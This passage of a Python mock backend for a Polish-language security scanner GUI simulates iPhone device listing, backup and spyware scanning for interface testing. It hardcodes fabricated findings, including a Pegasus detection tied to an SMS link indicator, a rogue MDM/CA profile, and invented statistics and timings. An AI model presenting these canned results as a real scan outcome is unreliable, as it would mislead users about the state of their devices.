        "„Utwórz kopię zapasową teraz”, najlepiej BEZ szyfrowania (zaszyfrowanej kopii Cerber nie przeanalizuje w "
        "całości). Możesz też wskazać folder z kopią przyciskiem „Wybierz kopię…”."])
    if not none:
        notes.append("Używam narzędzi Apple z Xcode (devicectl) do odczytu aplikacji i raportów awarii. Dokładniejszy "
                     "odczyt (podpisy aplikacji, profile aprowizacji) daje libimobiledevice: brew install "
                     "libimobiledevice ideviceinstaller.")
    emit("iphone_devices", devices=devices, backups=backups,
         tools={"libimobiledevice": False, "devicectl": not none, "apple_backup": not none, "paths": {}},
         access={"mobilesync": "missing" if none else "ok",
                 "mobilesync_path": f"{HOME}/Library/Application Support/MobileSync/Backup",
                 "backup_dir": f"{ROOT}/iphone_backups"},
         can_backup=None if none else "apple",
         backup_target={"dir": f"{HOME}/Library/Application Support/MobileSync/Backup", "free_bytes": 233_057_378_304},
         indicators={"total": 8516, "built": "2026-10-13 14:46:14", "sources": [
             {"name": "MVT", "license": "MIT", "url": "https://github.com/mvt-project/mvt-indicators"},
             {"name": "Amnesty Tech", "license": "CC-BY", "url": "https://github.com/AmnestyTech/investigations"},
             {"name": "Echap", "license": "CC-BY 4.0", "url": "https://github.com/AssoEchap/stalkerware-indicators"},
             {"name": "Citizen Lab", "license": "CC BY-NC-SA 4.0",
              "url": "https://github.com/citizenlab/malware-indicators"}]},
         notes=notes)


def _ifinding(i, category, title, location, severity, score, description, evidence, advice, threat=None):
    return {"id": f"f{i}", "category": category, "title": title, "location": location, "severity": severity,
            "score": score, "confidence": "HIGH" if score >= 60 else "MEDIUM", "description": description,
            "evidence": evidence, "evidence_total": len(evidence), "signals": [], "advice": advice, "threat": threat,
            "details": {}}


def cmd_iphone_scan(udid, backup, make_backup):
    t0, started = time.time(), now()
    enc = IPHONE_MODE == "encrypted"
    if udid:
        stage("device", "Odczyt informacji z iPhone'a…")
        for i, cur in enumerate(["informacje o urządzeniu", "lista aplikacji (Xcode)", "raporty awarii"]):
            emit("progress", stage="device", done=i, total=3, current=cur)
            nap(0.4)
    if make_backup and udid:
        stage("backup", "Tworzenie kopii zapasowej iPhone'a…")
        log("Tworzenie kopii zapasowej – na telefonie może pojawić się prośba o kod blokady; nie odłączaj kabla.")
        for pct in range(0, 101, 10):
            if CANCELLED:
                break
            emit("progress", stage="backup", done=pct, total=100, bytes=pct * 92_000_000, elapsed_s=pct * 3)
            nap(0.3)
    readonly_sandbox_stage()
    stage("analyze", "Analiza kopii zapasowej i danych z telefonu…")
    steps = ["Lista plików kopii", "Uprawnienia i lokalizacja", "Wiadomości SMS/iMessage", "Historia Safari",
             "Inne przeglądarki", "Dane stron WWW", "WhatsApp", "Procesy w sieci (DataUsage)", "Statystyki OSAnalytics",
             "Konta iMessage i interakcje", "Skróty", "Profile i MDM", "Ustawienia bezpieczeństwa", "Aplikacje"]
    spy = ["Nie resetuj od razu telefonu – najpierw zachowaj kopię zapasową i ten raport (to dowód dla specjalistów).",
           "Skontaktuj się ze specjalistami: Access Now Digital Security Helpline (help@accessnow.org, bezpłatnie) "
           "albo Amnesty International Security Lab.",
           "Zaktualizuj iOS do najnowszej wersji (Ustawienia → Ogólne → Uaktualnienia).",
           "Włącz Tryb blokady (Ustawienia → Prywatność i ochrona → Tryb blokady)."]
    prof = ["Jeśli to nie jest telefon służbowy albo nie rozpoznajesz profilu: Ustawienia → Ogólne → VPN i urządzenia "
            "zarządzane → wybierz profil → Usuń profil.", "Po usunięciu zmień hasło Apple ID i kod blokady."]
    findings = [] if CLEAN else [
        _ifinding(1, "spyware", "Ślad oprogramowania szpiegującego Pegasus (NSO Group) w wiadomościach SMS/iMessage",
                  "Library/SMS/sms.db", "malicious", 90,
                  "Znaleziono 1 wskaźnik znanych z ataków Pegasus (NSO Group) (w wiadomościach SMS/iMessage). Wskaźniki "
                  "pochodzą z publicznych śledztw (Amnesty Tech). To bardzo poważny sygnał infekcji albo próby ataku.",
                  ["free247downloads.com ← https://free247downloads.com/a1b2c3 (SMS od +48600100200, 2026-09-30 18:02)"],
                  spy, "Pegasus (NSO Group)"),
        _ifinding(2, "profile", "Profil konfiguracyjny: Ustawienia sieci", "Library/ConfigurationProfiles/profile-a1.stub",
                  "suspicious", 60, "Profil instaluje własny certyfikat główny (CA). Po włączeniu zaufania pozwala "
                  "odczytywać szyfrowany ruch HTTPS (podsłuch). (+1 inny wskaźnik)",
                  ["Ustawienia sieci (net.example.profile), Nieznana firma",
                   "zawartość: zarządzanie urządzeniem (MDM), certyfikat główny (CA); zainstalowany 2026-09-28 22:10"],
                  prof),
        _ifinding(3, "app", "Aplikacje spoza App Store: 2", "lista aplikacji", "low", 15,
                  "Te aplikacje nie pochodzą z App Store (firmowe, testowe, deweloperskie).",
                  ["Firma Helper (com.corp.helper)", "Notatki Pro (pl.example.notes) – aparat, mikrofon"],
                  ["Sprawdź, czy rozpoznajesz te aplikacje (aplikacje firmowe/testowe są normalne na telefonie "
                   "służbowym)."]),
    ]
    if enc:
        findings = findings[2:]
    for i, st in enumerate(steps):
        if CANCELLED:
            break
        emit("progress", stage="analyze", done=i + 1, total=len(steps), current=st)
        if i == 2 and findings and not enc:
            emit("iphone_finding", item=findings[0])
        if i == 11 and len(findings) > 1 and not enc:
            emit("iphone_finding", item=findings[1])
        nap(0.25)
    if findings:
        emit("iphone_finding", item=findings[-1])
    stage("report", "Zapisywanie raportu…")
    order = {"malicious": 4, "pua": 3, "suspicious": 2, "low": 1, "info": 0}
    worst_sev = max((f["severity"] for f in findings), key=order.get, default="info")
    verdict = {"malicious": "MALICIOUS", "suspicious": "SUSPICIOUS", "low": "INFO"}.get(worst_sev, "CLEAN")
    status = "skipped" if enc else "ok"
    checks = [{"id": "manifest", "title": "Lista plików kopii (Manifest.db)", "status": status,
               "detail": "kopia zaszyfrowana" if enc else "48 211 plików, 312 stron z zapisanymi danymi"},
              {"id": "sms", "title": "Wiadomości SMS/iMessage", "status": "missing" if enc else "ok",
               "detail": "brak bazy wiadomości w kopii" if enc else "12 480 wiadomości, 860 linków sprawdzonych"},
              {"id": "safari", "title": "Historia i karty Safari", "status": "missing" if enc else "ok",
               "detail": "" if enc else "4 120 adresów sprawdzonych"},
              {"id": "datausage", "title": "Procesy używające sieci (DataUsage)", "status": "missing" if enc else "ok",
               "detail": "" if enc else "412 procesów"},
              {"id": "profiles", "title": "Profile konfiguracyjne, MDM i certyfikaty", "status": status,
               "detail": "kopia zaszyfrowana" if enc else "1 profili"},
              {"id": "crash", "title": "Raporty awarii z telefonu", "status": "ok" if udid else "missing",
               "detail": "38 raportów, 21 nazw procesów" if udid else "brak raportów"},
              {"id": "apps", "title": "Zainstalowane aplikacje", "status": "ok", "detail": "87 aplikacji (85 z App Store)"}]
    limitations = (["Kopia jest zaszyfrowana hasłem – Cerber jej nie odszyfrowuje (wymagałoby to hasła i dodatkowej "
                    "biblioteki). Sprawdzono tylko listę aplikacji i dane urządzenia."] if enc else [])
    summary = {"mode": "iphone", "title": "iPhone (Ania)", "started": started, "finished": now(),
               "seconds": round(time.time() - t0, 1) + 94.0, "cancelled": CANCELLED, "verdict": verdict,
               "counts": {k: sum(1 for f in findings if f["severity"] == k) for k in order},
               "device": {"name": "iPhone (Ania)", "model": "iPhone 13", "product_type": "iPhone14,5", "ios": "17.6.1",
                          "udid": IPHONE_UDID},
               "backup": {**_iphone_backup(), "path": backup or _iphone_backup()["path"]},
               "device_read": {"collected": ["informacje o urządzeniu", "raporty awarii (38)"], "missing": []} if udid else None,
               "coverage": "partial" if enc else "full", "findings": findings, "checks": checks,
               "posture": {"ios": "17.6.1", "lockdown_mode": False, "passcode_set": True, "mdm": not enc,
                           "apps_total": 87, "apps_not_appstore": 2, "backup_encrypted": enc},
               "apps": [], "apps_total": 87, "profiles": [], "stats": {"backup_files": 48211},
               "indicators": {"total": 8516, "built": "2026-10-13 14:46:14"}, "limitations": limitations,
               "advice": (spy + prof) if not CLEAN else ["Zaktualizuj iOS (Ustawienia → Ogólne → Uaktualnienia)."],
               "sandbox": {"mode": "readonly", "isolation": ["cały dysk dostępny WYŁĄCZNIE do odczytu"],
                           "verified": ["zapis poza sandboksem zablokowany", "połączenia sieciowe zablokowane"]},
               "report_html": None, "report_json": None}
    rid = "gui-" + _dt.datetime.now().strftime("%Y%m%d-%H%M%S") + "-iphone"
    summary["files"] = 48211
    summary["results"] = []
    hp, jp = write_report(summary, rid)
    summary["report_html"], summary["report_json"] = hp, jp
    emit("iphone_done", summary=summary)
    sys.exit(130 if CANCELLED else 0)


def cmd_iphone(args, make_backup):
    sub = args[0] if args else "devices"
    if sub == "devices":
        cmd_iphone_devices()
    elif sub == "scan":
        cmd_iphone_scan(args[1] if len(args) > 1 else None, None, make_backup)
    elif sub == "backup" and len(args) > 1:
        cmd_iphone_scan(None, args[1], False)
    else:
        emit("error", msg="Nieznane polecenie iphone", fatal=True)
        sys.exit(1)


def main():
    signal.signal(signal.SIGINT, _on_sigint)
    signal.signal(signal.SIGTERM, _on_sigint)
    ap = argparse.ArgumentParser(prog="mock_backend.py")
    ap.add_argument("command", choices=["info", "scan", "sandbox", "github", "huggingface", "laptop",
                                        "quarantine", "history", "ai-install", "url", "watch", "iphone"])
    ap.add_argument("args", nargs="*")
    ap.add_argument("--level", default="deep", choices=["quick", "patterns", "deep", "mega"])
    ap.add_argument("--ai", action="store_true")
    ap.add_argument("--fast", action="store_true")
    ap.add_argument("--app", action="store_true")
    ap.add_argument("--no-quarantine", action="store_true")
    ap.add_argument("--quarantine", action="store_true")
    ap.add_argument("--net", action="store_true")
    ap.add_argument("--idle", type=int, default=600)
    ap.add_argument("--make-backup", action="store_true")
    ns = ap.parse_intermixed_args()
    err(f"[mock] cerber.gui_backend {ns.command} {' '.join(ns.args)} level={ns.level} ai={ns.ai}")
    c = ns.command
    need = {"scan": 1, "sandbox": 1, "github": 1, "huggingface": 1, "quarantine": 1, "url": 1}
    if len(ns.args) < need.get(c, 0):
        emit("error", msg="Brak wymaganego argumentu.", fatal=True)
        sys.exit(1)
    if c == "info":
        cmd_info()
    elif c == "history":
        cmd_history()
    elif c == "quarantine":
        cmd_quarantine(ns.args[0])
    elif c == "scan":
        cmd_scan(ns.args, ns.ai)
    elif c == "sandbox":
        cmd_sandbox(ns.args[0], ns.ai)
    elif c == "github":
        cmd_github(ns.args[0], ns.ai)
    elif c == "huggingface":
        cmd_huggingface(ns.args[0], ns.ai)
    elif c == "laptop":
        cmd_laptop(ns.level, ns.ai)
    elif c == "ai-install":
        cmd_ai_install()
    elif c == "url":
        cmd_url(ns.args[0], ns.ai)
    elif c == "iphone":
        cmd_iphone(ns.args, ns.make_backup)
    elif c == "watch":
        cmd_watch(ns.level if ns.level in ("quick", "deep") else "quick", ns.quarantine and not ns.no_quarantine, ns.idle,
                  ns.net)


if __name__ == "__main__":
    try:
        main()
    except BrokenPipeError:
        sys.exit(1)
